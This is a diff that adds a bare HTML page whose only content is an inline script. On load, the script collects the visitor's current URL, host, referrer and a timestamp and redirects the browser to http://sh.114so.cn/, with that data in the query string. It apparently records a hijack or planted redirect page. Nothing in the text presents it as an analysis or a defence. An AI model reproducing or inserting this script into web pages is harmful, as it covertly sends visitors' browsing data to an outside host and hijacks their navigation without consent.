@@ -1,0 +1,5 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"> <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"> 
+<head><META HTTP-EQUIV="pragma" CONTENT="no-cache"> <META HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> <META HTTP-EQUIV="expires" CONTENT="0"> <script 
+type="text/javascript"> var pp = "164&pre="+(new Date()).getTime(); var s=String(window.location.href); var host=escape(s.substring(7,s.indexOf('/',7))); var 
+ref=escape(document.referrer); s = escape(s); var su = s+"&host="+host+"&refer="+ref+"&server="+pp; var ifmurl; if (self.location == top.location){ ifmurl= "dnsA.aspx?AIMT="; } else { 
+ifmurl= "dnsB.aspx?AIMT="; } document.location= "http://sh.114so.cn/" + ifmurl + su; </script>
